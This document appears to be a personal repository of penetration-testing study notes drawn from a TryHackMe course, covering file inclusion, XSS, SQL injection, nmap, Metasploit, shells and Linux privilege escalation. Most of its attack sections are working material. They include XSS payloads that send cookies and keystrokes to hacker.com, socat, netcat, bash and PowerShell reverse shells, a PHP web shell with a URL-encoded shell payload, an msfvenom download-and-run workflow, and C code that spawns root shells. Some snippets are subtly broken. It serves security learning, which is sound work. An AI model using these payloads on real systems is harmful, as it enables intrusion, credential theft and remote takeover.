
# VAPT Learning Notes – Table of Contents

This repository documents my hands-on learning and notes in Vulnerability Assessment and Penetration Testing (VAPT).

## Contents Overview

### 1. File Inclusion
- Path Traversal
- Common OS File Locations (Linux & Windows)
- Null Byte Injection (LFI)

### 2. Cross-Site Scripting (XSS)
- Basic Proof of Concept Payloads
- Session Stealing
- Keylogging
- Input Escaping Techniques
- Filter Bypass Payloads
- XSS Polyglots

### 3. SQL Injection (SQLi)
- Blind SQL Injection Concepts
- Boolean-Based Blind SQLi
  - Column Enumeration
  - Database Enumeration
  - Table Enumeration
  - Username & Password Enumeration
- Time-Based Blind SQLi

### 4. Burp Suite
- Proxy
- Repeater
- Intruder
- Decoder
- Comparer
- Sequencer
- Extensions Overview

### 5. Reconnaissance
- Passive Reconnaissance
- Active Reconnaissance

### 6. Nmap
- Live Host Discovery
- Port Scanning Techniques
- TCP Scan Types
- UDP Scanning
- Scan Fine-Tuning
- Spoofing and Decoys
- Fragmented Packets
- Service Detection
- OS Detection and Traceroute

### 7. Network Protocols and Services
- Telnet
- HTTP
- FTP
- SMTP
- POP3
- IMAP
- Cleartext Protocol Risks

### 8. Sniffing Attacks
- Tcpdump
- Wireshark
- Tshark
- Mitigation Using TLS

### 9. Man-in-the-Middle (MITM) Attacks
- ARP Poisoning
- Common Tools
- Cryptographic Mitigations

### 10. TLS / SSL
- OSI Layer Placement
- Protocol Upgrades (HTTPS, FTPS, etc.)
- TLS Handshake Process
- Certificate Authorities
- MITM Protection

### 11. Secure Shell (SSH)
- Secure Remote Administration
- Authentication
- Secure File Transfer (SCP)

### 12. Password Attacks
- Hydra Usage
- Defensive Measures

### 13. Reverse and Bind Shells
- Reverse Shells
- Bind Shells
- Linux Targets
- Windows Targets
- Encrypted Shells with OpenSSL

### 14. Netcat Shells
- Linux Reverse Shell
- Linux Bind Shell
- Windows Reverse Shell

### 15. Web Shells
- PHP Web Shells
- Remote Command Execution
- Windows PowerShell Payload Usage

### 16. Vulnerability Databases
- Common Vulnerabilites
- Exploit-DB

### 17. MetaSploit
- Components
- Modules
- Types of Payload
- msfconsole
- Meterpreter
- MsfVenom
- Multi/Handler

### Linux Privilege Escalation
- Enumeration
- Privilege Escaltion: Kernel Exploits
- Privilege Escalation: Sudo
- Privilege Escaltion: SUID
- Privilege Escalation:  Capabilities
- Privilege Escalation: Cron Jobs
- Privilege Escalation: PATH
- Privilege Escalation: NFS

  

---

# FILE INCLUSION:

- Path Traversal:
  
		$ http://webapp.com/get.php?file=../../../../boot.ini
  
		$ http://webapp.org/get.php?file=../../../../windows/win.ini

- Common OS files location:
  
		/etc/issue
  
		/etc/profile
  
		/proc/version
  
		/etc/passwd
  
		/etc/shadow
  
		/root/.bash_history
  
		/var/log/dmessage
  
		/var/mail/root
  
		/var/log/dmessage (has global system messages)
  
		/var/mail/root
  
		/var/log/apache2/access.log ( has accessed requests for Apache web server)
  
		C:\boot.ini
  
		/root/.ssh/id_rsa (private SSH keys)

- Null Byte Usage (local file inclusion):
  
		payload: include("languages/../../../../../etc/passwd%00").".php");

# XSS PAYLOADS:

	$ <script>alert('hello');</script> (POC)
	
	$ <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script> (session stealing)
	
	$ <script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
	(keylogger)
	
	$ "><script>alert('sup');</script> (escaping input tag)
	
	$ </textarea><script>alert('yoh');</script> (escaping textarea)
	
	$ <sscriptcript>alert('THM');</sscriptcript> (bypassing filters)
	
	$ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('hi!')//>\x3e (XSS polyglots all in one type sh)

# SQLi PAYLOADS:

- Blind SQLi:
  
		$ select * from users where username='%username%' and password='%password%' LIMIT 1;
  
- Boolean Based Blind SQLi:
  
		$ select * from users where username = '%username%' LIMIT 1;
  
		$ username UNION SELECT 1;-- (saerching number of columns in the user's table)
  
		$ username UNION SELECT 1,2,3;-- (finding the path to the actual column)
  
		$ username UNION SELECT 1,2,3 where database() like '%';-- (enumeration of the database)
			-> cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string matches the first letter of the database name. After finding the first letter do it until we find the database full 			name.
  
		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--  (enumeration of table name)
			-> using infromation_schema database to find the table name just like we found the databse name using "like" operator.
  
		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%'; (enumerating column name)
  
		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'; (preventing the discovery of the same column twice)
  
		$ username UNION SELECT 1,2,3 from users where username like 'a% (enumeration of username)
  
		$ username UNION SELECT 1,2,3 from users where username='something' and password like 'a% (enumerating password)

- Time Based Blind SQLi:
  
		$ username UNION SELECT SLEEP(5);-- (if there is pause to the response, it worked otherwise it failed)
  
		$ username UNION SELECT SLEEP(5),2;-- (adding another column until the response time is 5 seconds)

# Burp Suite:

- Proxy (enables interception and modification of requests and responses)
  
- Reapeater (captures, modifies and resends the captured request multiple time) -- Useful for crafting SQLi payloads.
  
- Intruder ( allows for spraying endpoints with requests) -- used for brute-force attacks or fuzzing endpoints.
  
- Decoder (data transformation) -- decode or encode payloads before sending.
  
- Comparer (compares two pieces of captured data at word or byte level)
  
- Sequencer (used when assessing randomly generated data such as session cookie values)
  
- Also has extensions to enhance the framework's functionality.

# Reconnaissance:

- Passive Reconnaissance: whois, nslookup, dig, shodan.io
  
- Active Reconnaissance: ping, traceroute, telnet, nc

# Nmap Live Host Discovery:

	$ nmap -sn TARGETS
	
	$ nmap -PR -sn TARGET/24 (ARP scan on the same subnet)
	
	$ nmap -PE -sn MACHINE_IP/24 (ICMP echo)
	
	$ nmap -PP -sn MACHINE_IP/24 (ICMP Timestamp)
	
	$ nmap -PM -sn MACHINE_IP/24 (ICMP Address Mask)
	
	$ nmap -PS -sn MACHINE_IP/24 (TCP SYNchronize)
	
	$ sudo nmap -PA -sn MACHINE_IP/24 (TCP ACKnowledge)
	
	$ sudo nmap -PU -sn 10.10.68.220/24 (UDP)
	
	$ --dns-servers DNS_SERVER (Reverse-DNS Lookup)

# Nmap Port Scanning:

- TCP flags:
  
    	- TCP header = 24 bytes of a TCP segment
  
    			-> First row (Source port number and Destination Port number) each allocating 16 bits (2 bytes)
  
    			-> Second row is Sequence number and third row is Acknowledgement Number
  
    			-> Total six rows. Each row contains 32 bit (4 bytes) so total 6 rows equals to 24 bytes
  
    	- TCP Header Flags:
  
        		-> URG : urgent flag first priority to be processed
  
        		-> ACK: acknowledge the receipt of a TCP segment
  
        		-> PSH: push flag asking TCP to pass the data to the applicatioh
  
        		-> RST: Reset flag used to reset the connection
  
        		-> SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
  
        		-> FIN: Finish flag meaning the sender has no more data to send
        
- TCP Connect Scan:
  
		$ nmap -sT MACHINE_IP

- TCP SYN Scan:

		$ sudo nmap -sS MACHINE_IP (does not need to complete a TCP 3-way handshake)

- Other TCP scans:
  
    	-> -sN (null), -sF (fin), -sX (Xmas)
        		->Similarites: if port open RST packet is received otherwise reported as open|filtered
  
    	-> -sM (Maimon scan)
  
    	-> -sA (ACK scan)

- UDP Scan:
  
		$ sudo nmap -sU MACHINE_IP 

- Fine-Tuning:
  
   		 -> -p<1-50> (set ranges), -F (100 most common ports), -T<0-5> (controlling scan timing), --min-rate<number> and --max-rate<number>
    
- Spoofing and Decoys:
  
		$ nmap -S SPOOFED_IP MACHINE_IP (spoofed ip)
  
		$ nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP (Decoy)
    			-> 3rd and 4th is randomly generated while fifth is the attacker.
  
        	-> Advantages:  make the scan look like coming from multiple IPs so the attacker's IP would be lost.

- Fragmented Packets:
  
		$ sudo nmap -sS -p80 -f MACHINE_IP
  
    		-> The 24 bytes of TCP header will be divided into multiple bytes of 8.
  
    		-> So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
    
- Service Detection:
  
		$ sudo nmap -sV MACHINE_IP (grabs service banner and bersion info)

- OS Detection and Traceroute:
  
		$ sudo nmap -sS -O MACHINE_IP (OS details)
  
		$ sudo nmap -sS --traceroute MACHINE_IP (finding routers between attacker and the target)

# Protocols and Servers:

- Telnet (connects to a virtual terminal of another computer) default port - 23
  
		$ telnet MACHINE_IP

 - HTTP (HyperText Transfer Protocol) default port - 80, transfers web pages like HTML pages and images.
 
		$ telnet MACHINE_IP 80

		$ host:telnet

		$ GET /index.html HTTP/1.1

- FTP (File Transfer Protocol) default port - 21
  
		$ ftp MACHINE_IP
  
		$ Name: ****
  
		$ Password: ****
  
		ftp> ls
  
		ftp> ascii
  
		ftp> get something.txt
  
		ftp> exit

- SMTP (Simple Mail Transfer Protocol) default port - 25
  
   	 - Components: Mail Submission Agent(MSA), Maile Transfer Agent(MTA), Mail Delivery Agent(MDA) and Mail User Agent (MUA)
  
   	 - MUA -> MSA -> MTA -> MDA -> MUA
  
			$ telnet MACHINE_IP 25
  
			$ helo telnet
  
			$ mail from: <address>
  
			$ rctp to: <addres>
  
			data: something
  
			$ quit


- POP3 (Post Office Protocol 3): used to download the email from MDA server. default port - 110
  
		$ telnet MACHINE_IP 110
  
		$ USER ****
  
		$ PASS ****
  
		$ STAT
  
		$ LIST
  
		$ RETR 1 (retrive the first message on the list)
  
		$ QUIT
  
		-> Disadvantage: mailboxes are not synchronized like read and unread messages.

- IMAP (Internet Message Access Protocol): keeps email synchronized across multiple devices. default port - 143
  
		$ telnet MACHINE_IP 143
  
		$ c1 LOGIN username password
  
		$ c2 LIST "" "*"
  
		$ c3 EXAMINE BOX
  
		$ c4 LOGOUT

** All of these protocols uses cleartext so anyone watching the network traffic would know the user's credential.

# Sniffing Attack:

- tools: Tcpdump, Wireshark, Tshark
  
- Using tcpdump:
  
		$ sudo tcpdump port 110 -A (requires access to the network traffic)
  
    	-> here POP3 packets are being captured. -A means we want it in ASCII format
  
  		-> Solution: Adding an encryption layer on top of any network protocol. Particularly, Transport Layer Security (TLS).
    
# Man-in-the-middle (MITM) attack:

- tools: bettercap, ettercap -> effects cleartext protocols like FTP,SMTP and POP3.
  
- commonly attained by ARP poisoning on the same network subnet and capturing network traffic and all the cleartext protocols information.
  
- Solution: use of cryptography like Public Key Infrastructure(PKI) and trusted root certificates (which is TLS).

# Transport Layer Security (TLS)/ Secure Sockets Layer (SSL):

- Falls under the Presentation layer of the OSI model. So, data will be shown in an encrypted format (ciphertext) instead of its original form.
  
- Expect all servers to use TLS instead of SSL.
  
- After this layer the cleartext protocols and servers upgrades to HTTPS (443), FTPS (990), SMPTS (465), POP3S (995), IMAPS (993).
  
- ClientHello (sends to the server) -> ServerHello, Certificate*, ServerKeyExchange*, CertificateRequest*, ServerHelloDone (server provides required paramters to be trustworhty) -> Certificate*, ClientKeyExchange, [ChangeCipherSpec], Finished (client responds with its key and other information to generate the master key then proceeds to use encryption for communication with the server -> [ChangeCipherSpec], Finished (server also switches to encryption and informs the client)
  
- Public Certificates used by servers are signed by certificate authorities (CA) trusted by our systems.
  
- MITM attack. Safe

# Secure Shell (SSL):
- Created to provide a secure way for remote system administration.
  
- Also uses cryptography
  
- SSH server (p22) and client required.
  
- Authenticate using username and password.
  
		$ ssh nischal@MACHINE_IP
  
		$ nischal@MACHINE_IP's password: helloworld
  
- Secure Copuy protocol can also be used to copy files from the server.
  
		$ scp document.txt nischal@MACHINE_IP:/home/nischal
  
		$ nischal@MACHINE_IP's password:
  
		$ document.txt

# Password Attack:

- tool: Hydra (all methods related to HTTP)
  
		$ hydra -l username -P wordlist.txt MACHINE_IP service
  
- Solution:

    -> make user to have a strong password
  
    -> account lockout after certain number of failed attempts
  
    -> use of CAPTCHA
  
    -> Two-factor Auth
  
    -> established knowledge about the user such as IP-based geolocation


# REVERSE AND BIND SHELL:

- Reverse shell is a shell we as an attacker would get by forcing the target to execute a code that would connect back to our computer. We need to have a listener ready in our computer to receive such connection.

- Bind shell is a shell where the executed code on the target machine will open up a listerner and brodacast the port to the internet which we as an attacker can connect back to using the IP of the target machine and the port they opened to obtain Remote Code Execution.

  ## SOCAT COMMANDS:

- Reverse Shell:
  
		$ socat TCP-L:<port> -
  
- for windows to connect back:
  
		$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
  
	-> The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
  
- for linux to connect back:
  
		$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

- Bind Shell
  
		$ socat TCP-L:<PORT> EXEC:"bash -li" (Target=Linux)
  
		$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes (Target=Windows)
  
		$ socat TCP:<TARGET-IP>:<TARGET-PORT> - (on the attacking machine applicable for both targets)

- Linux Target only:
  
		$ socat TCP-L:<port> FILE:`tty`,raw,echo=0 (attacker)
  
		$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane (target)

# SOCAT encrypted Shells:

	$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt (generates a SSL certificate)

	$ cat shell.key shell.crt > shell.pem (merge the created files in .pem file)

- Reverse Shell:
  
		$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - (attacker)
  
		$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash (target)
	
- Bind Shell:
  
		$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes (target)
  
		$ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - (attacker)
	
#FOR LINUX:

- Here we used Netcat, but instead of netcat command we can also use socat here as it gives more freedom to achieve goals. Below is a simple demostration of using netcat listener.
  
- Reverse Shell:
  
		$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)
  		-> creating a named pipe at /tmp/f which gets piped into the /sh.

- Bind Shell:
  
		$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)

#FOR WINDOWS:

		$ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  (target)
		-> Useful one-liner PSH Reverse Shell to get powershell on windows

#WEBSHELLS:

	$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> (basic one line format) 
	
- RCE is normally gained in linux, but for Windows we need to copy this into the URL as the cmd argument:
  
		$ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

# VULNERABILITIES RESEARCH:

- Scoring Vulnerabilites:

 		 -> CVSS (Common Vulnerability Scoring System)

 		 -> VPR (Vulnerability Priority Rating)

- Vulnerability Databases:

  		-> NVD (National Vulnerability) - CVE - YEAR - IDNUMBER

  		-> Exploit-DB - POC for exploitation to exploit specific vulnerability

- Automated vs Manual Vulnerability Research:

 		 -> Nessus (primarily used for automated vulnerability research)

  		 -> Metasploit ( auxiliary module for scanning known signatures of a vulnerability)

- Common Vulnerabilites:

  		-> Security Misconfigurations

  		-> Broken Access Control

 		-> Insecure Deserialization

 		-> Injection

# METASPLOIT:

- Main Components:

		-> msfconsole

		-> Modules

  		-> Tools

  		-> Vulnerability, Exploit, Payload

- Modules:

  		-> Auxiliary - Scanners, crawlers and fuzzers.

  		-> Encoders - encode the exploit and payload to bypass signature-based antivirus solution.

  		-> Evasion - will try to evade the antivirus with more or less success.

  		-> Exploits - a piece of code which uses a vulnerability present on the target system.

  		-> NOPs - No OPeration do nothing. Used as buffer to achieve consistent payload size.

		-> Payloads - code that runs on the target system. Needed to achieve results on the target such as getting a shell, loading malware or backdoor.

  		-> Post - final stage of penetration testing, post-exploitation.

- Types of Payloads:

  		-> Adapters: Wraps single payloads to convert them into different formats.

  		-> Singles: Self-contained payloads

  		-> Stagers: Sets up a connection channel between Metasploit and the target system.

  		-> Stages: Downloaded by the stager after setting the stage by uploading a stager to the target system. The final payload sent will be relatively large than the first one.

- Single vs Staged Payloads:

  		-> generic/shell_reverse_tcp (inline/single)

  		-> windows/x64/shell/reverse_tcp (staged)

- msfconsole:

  		> search type:exploit windows ms17-010

   		> use * (any exploit you want to use based on the known vulnerability)

		> info

 		> show options

 		> set PARAMETER_NAME VALUE

  		> show payloads

  		> setg / unsetg (set or unset the global variable)

  		> exploit/run

   		> exploit -z (runs the exploit and background the session)

		> sessions (checks active sessions)

 		> session -i ID (interact with the desired session)

## Meterpreter:

-  a Metasploit payload which is basically a post-exploitation tool after obtaining a meterpreter shell of the target machine
 
- runs in the memory of the target machine so it is hard to be detected during antivirus scans.
 
- uses encrypted communications with the server where Metasploit runs.
 
- Commands (meterpreter):

  		> msfvenom --list payloads | grep meterpreter (depends which one to use by analyzing target operating system, components and the network connection type)

  		> getpid

   		> ps

		> help

 		> search -f document.txt

 		> background, exit, guid, info, migrate, run, load and many more

## MSFVENOM:

- used to access all payloads available in the framework and allows to create payloads in different format to the attacker need or the vulnerable machine.

		$ msfvenom -l payloads

		$ msfvenom -p <PAYLOAD> <OPTIONS>
	
		$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
	        {<OS>/<arch>/<payload>}
			
		$ shell_reverse_tcp (stageless payload)
	
		$ shell/reverse_tcp (staged payload)
	
		$ metasploit multi/handler (used for staged payload)

## Multi Handler:

- used to receive incoming connection.

  		> use exploit/multi/handler

   		> show options (change what needs to be changed)

		> set LHOST ATTACKIN_MACHINE_IP LPORT WHAT WE USED WHEN CREATING THE MSFVENOM PAYLOAD

  		> set payload USED IN MSFVENOM PAYLOAD

		> run

- Use of MsfVenom and Multihandler:

  - create customised payload of an exploit and give permission to the file to be edited (chmod +x)
    
  - host a python server on the attacking machine
    
    	$ python3 -m http.server 9000/shell.elf
  
  - use the compromised target machine to download the files from the python web server

		$ wget http://ATTACKING_MACHINE_IP:9000/shell.elf

		$ chmod +x shell.elf

		$ ./shell.elf

	- now what the multi handler does is capture the payload msfVenom created and the one target machine just executed and automatically loads a meterpreter shell on the msfconsole.
 
  	- this staged payload requires different tabs to be open, one for connecting to the target machine using ssh or any known methods, two for msfvenom to generate payload and host a python server and third one to listen to the upcoming payload that msfvenom created that was ran on the target machine.

* This is for LINUX target machine. For windows also it is the same but the command to download the payload from the attacker server is different and execution of the file is also different.

# LINUX PRIVILEGE ESCALATION:

- going from lower permission to a higher permission in LINUX target machine.

  - Enumeration:

	- Basic Commands

			$ hostname

			$ uname -a

			$ /proc/version

			$ /etc/issue

			$ ps

			$ env

			$ /etc/passwd

			$ cat /etc/passwd | cut -d ":" -f 1

			$ netstat-a,-at,-au,-l,-s,-i,-ano
 
  - Find Commands:

			$ find . -name nischal.txt (find this file in the current directory)

			$ find /home -name nischal.txt (find file in home dir)

			$ find / -type d -name config (dictory named config under"/")

			$ find / -type f -perm 0777 (files with 777 permissions)

			$ find / -perm a=x (executable files)

			$ find /home -user nischal (all files for user "nischal" under "/home"

			$ find / -mtime 10 (modifies in the last 10 days)

			$ find / -atime 10 (accessed in the past 10 days)

			$ find / -cmin -60 (changed in the last 60 mins)

			$ find / -amin -60 (accessed withing the last 60 mins)

			$ fine / -size 50M (with size of 50MB)

			$ find / -writable -type d 2>/dev/null (world-writable folder)
			-> 2>/dev/null redirects error to "/dev/null" so we can get cleaner output

			$ find / -perm -333 -type d 2>/dev/null (world-writable folder)

			$ find / -perm -o x -type d 2>/dev/null (world-executable folders)

			$ find / -name python* (supported languages)

			$ find / -perm -u=s -type f 2>dev/null (files with the SUID bit)
    		-> this allows us to run fule with a higher privilege than the current level we end up with while getting the linux shell)


## Privilege Escalation: Kernel Exploits

- Identifying the kernel version

- Searching and finding the exploit code by researching the version of the target system

- Serving a web server to transfer the exploit to the target machine

- Downloading the exploit in the target machine (/tmd folder is usaully safe for this) and giving it executable permissions

- Compiling and executing

- Running the exploit

- Solution:

  	-> Keeping checks on the kernel updates and patches to be safe from known vulnerabilites.

  	-> Enforcing SELinux or AppArmor policies so it blocks unauthorized code execution. (for eg: preventing the execution of malicious code in common /tmp directories).

  	-> Detecting aunauthorized use of gcc or other compilers by non-admin users.

## Privilege Escalation: Sudo

- Low level users do not have higher privileges to run programs with root privileges. So, because of some situations, system administrators might provide regular users some flexibility on their privileges. By checking the root privileges of a low level user, we can further escalate into the root user.

			$ sudo -l (checking the users root privileges)

  - Use of GTFObins to search for exploits and commands that could provide root access depending on the type of privilege user currently has.
 
  - Leveraging LD_PRELOAD: LD_PRELOAD is a function which allows any program to use shared libraries and we can find it within the context of checking root privileges in the field of 'env_keep'.

- Steps for escalating this function:

		-> Checking for LD_PRELOAD

		-> Writing a simple C code which shhould be complied as a share object (.so extension)

		-> running the program with sudo rights and the LD_PRELOAD option to the .so file

  				#include<stdio.h>
  
  				#include<sys/types.h>
  
  				#include<stdlib.h>
  
  

  				void_init() {
  
  				unsetenv("LD_PRELOAD");
  
  				setgid(0);
  
  				setuid(0);
  
  				system("/bin/bash");
  				}

				$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles

  - Now we can find almost any program our user can run with sudo
 
    	$ sudo LD_PRELOAD=/home/nischal/ldpreload/shell.so find


## Privilege Escalation: SUID

- Files can have read, write and execute permissions. But, with SUID things are different, any files could be executed with the permission level of the file owner or the group owner. We could notice it with the "s" bit set showing their special permission.

  		$ find / -type f -perm -04000 -ls 2?/dev/null

  - SUID bit set for any low level commands such as nano, base64, e.t.c could result in the full compromise of the system beacuse we could further escalate the privilege by gaining access to the /etc/shadow file or simple exploiting the base64 read command for every files in the system.

- GTFObins is a reliable tool for using suchh exploits as well.

## Privilege Escalation:Capabilities

- Increasing the privilege level of a process or binary to help manage privileges at more granular level is "Capabilites". For example, a SOC analyst needs a tool to initiate socket connections which a regular user would not be able to do. So system administrators change the capabilites of the binary if they do not want to give them the privilege of a higher level user.

  		$ getcap -r / 2>/dev/null

		-> If we get a result such as: /home/nischal/vim = cap_setuid+ep, then we know that this capabilites has a SUID bit set. This privilege escalation vector is not discoverable when enumerating the file itself looking for SUID. So, once again we can check the GTFO bins to check the list of binaries that could be leveraged for privilege escaltion.

## Privilege Escaltion: Cron Jobs

- Cron jobs are mainly used for running scripts or binaries at specific times. If there is scheduled task that runs with root privileges then we can change the script that will be run at the time and run our script to escalate the privilege to the root. (By default they run with the privilege of their owners and not the current user)

  		$ cat /etc/crontab

  		-> So, if we see that a file "backup.sh" runs with the root privilege at a certain time say like every 5 minutes then we can modify this script to give us a shell with the root privilege.

  		$ nano backup.sh (assuming we found this script)

		#!/bin/bash

  		bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1

  		-> everything in this script needs to be changed with the command above. The goal here is to obtain a reverse shell in the attacking machine. Commands like 'nc' will not work in this case or it depends on the available tools.

  		* reverse shells are always prefferable beacuse we do not want to compromise the system integrity during real penetration tesing engagement.

  		- Then, we will run a listener on our attacking machine to receive the incoming connection.

  		$ nc -nlvp 7777

  		- Assuming the script will run every five minutes, we should just wait until the script will run and we will get the reverse shell on our attacking machine with the root id.

- Crontab is worth checking beacuse of its easy privilege escaltion vectors.

- It is also worth to understand the function of the script and how any tool is used within the context such as tar,7z.rsync,e.t.c.

- Such type of scripts are usually left unchecked because of certain levels of understanding of such exploits by system administrators. So cleaning the relevant cron job after the script becomes useless is very important.

## Privilege Escaltion: PATH

- PATH in Linux is an environmental variable that commands the operating system where to search for executables. So, if a folder for which the compromised user has written permission to is lacated in the PATH, we could hijack an application to run a script.

- For any command that is not built into the shell or which is not defined with an absolute path, Linux will try to search it in folders defined under $PATH.

  		$ echo$PATH (see what is in the PATH)

		-> If we type nischal to the command line, then Linux will look for an executable called "nischal" in the PATH.

  - Leveraging this environmental variable solely depends on the existing configuration of the target system. So, it is always a good idea to ask yourself these questions before trying to run a script:
 
    	-> Under $PATH, what folders are located?

		-> Do the current user has write privileges for any of these folders?

		-> Can you modify $PATH?

		-> Is there a script/application you can start that will be affected by this vulnerability?

	- We will be using a simple script for demo purpose to take advantage of this vulnerability
 
    		$ nano path.c

			#include<unistd.h>
    

			void main() {

			setuid(0);

			setgid(0);

			system("nischal");

			}

			-> Here, the script tries to launch a system binary called "nischal", however we can use any binary here.

			-> First, we need to compile this script into an executable and set the SUID bit.

			$ gcc path.c -o path -w

			$ chmod u+s path

			$ ls -l (should give the file "s" bit)

			-> Once this gets executed, "path" will look for an executable name "nischal" inside folders listed under PATH

			-> If any writable folder falls under PATH, then we can create a binary name "nischal" under that directory and have our "path" script run in it. AS we have set the SUID bit, the binary will run with root privilege.

			$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

			-> This command will search for writable files where we could write our script to.

			-> After this we can compare it with the PATH to find folders we could use.

			-> We could use /tmp directory beacuse it is used for temporary executable files and is a standard, shared space for transient data. It is easier to write folder also. So, if /tmp: is not in the $PATH variable then we could add it using:

				$ export PATH=/tmp:$PATH

			 -> At this point, the path script will also look under /tmp folder for an executable named "nischal". So the next thing we need to do is copying /bin/bash as "nischal" under this folder.

				$ cd /tmp

				$ echo "bin/bash" > nischal

				$ chmod 777 nischal

				$ ls -l nischal

				-> We could see the executable "nischal" on this folder. So, now we need to go back to the directory where we created the "path" script where we set its SUID bit.

				$ ./path

				$ id

				root

## Privilege Escalation: NFS

- Privilege escaltion vectors do not only lie on the internal access, but also shared folders and management interfaces such as SSh and Telnet can help us gain root access on the target system. But, here we will be talking about NFS (Network File Sharing) which is created during the NFS server installation and can be read by users. It is kept in /etc/exports.

  		$ cat /etc/exports

  - The eye catching and critcal element for this type of privilege escalation vector is the "no_root_squash" option. By default, NFS changes the root user to nfsnobody and strip any file from operating with root privileges. If the "no_root_squash" option is present on a writable share, then we can create an executable with SUID bit set and run it on the target system.
 
  - First, we can start by enumerating the mouontable shares from our attacking machine. It is better to use root in the attacking machine as we need to mount to the /tmp directory.

			# showmount -e TARGET_MACHINE_IP

  - If it shows the export list, as it should if the no_root_squash option is seen in the victim machine, we could mount the "no_root_squash" to our attacking machine and create an executable. First, we need to create a folder on the /tmp directory where we will mount the folder from target machine.
 
    		# mkdir /tmp/nischal

			$ mount -o rw TARGET_MACHINE_IP:/FOLDER_WITH NO_ROOT_SQUASH /tmp/nischal

  - As we can set SUID bits, we will use a simple executable that will run /bin/bash on the victim system. For this we need to be on the directory where we have mounted the vulnerable folder of the target machine

			# nano nischal.c

			#include <stdio>

			#include <stdlib.h>		// for system()

			#include <unistd.h>		//for setuid(), setgid()

			int main() {

			setgid(0);

			setuid(0);

			system("/bin/bash");

			return 0;
	

			-> save and exit

	- Assuming, that target machine doesnot has the latest version of the GLIBC, and does not has compiler so it could compile it itslef, we can use a very large binary so that the execution doesnot fail on the target later on.

			# gcc nischal.c -o nischal -static

			# chmod +s nischal (setting SUID)

			# ls -l nischal

	- So, when we will go back to our target machine, both files (nischal.c and nischal will be already present under the folder which we mounted to the attacking machine. So, basically this is one of the application of a mounted share. Now we just need to run the executable.
 
    		$ ./nischal

			$ id

			uid=0(root) gid=0(root)

	- It is important to notice that the executable file had SUID bit set, that is why the system runs with root privileges.
    
 
  			

	

	



  
			


# REFERENCES

OFFSEC’s Exploit Database archive. https://www.exploit-db.com/

OFFSEC’s Exploit Database archive. https://www.exploit-db.com/google-hacking-database

Swisskyrepo. PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings. GitHub. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Danielmiessler. GitHub - danielmiessler/SecLists  https://github.com/danielmiessler/SecLists

TryHackMe | Cyber Security Training. (2026). TryHackMe. https://tryhackme.com/paths/JrPenetrationTester
 
     








	
	

	
	
	
	
	









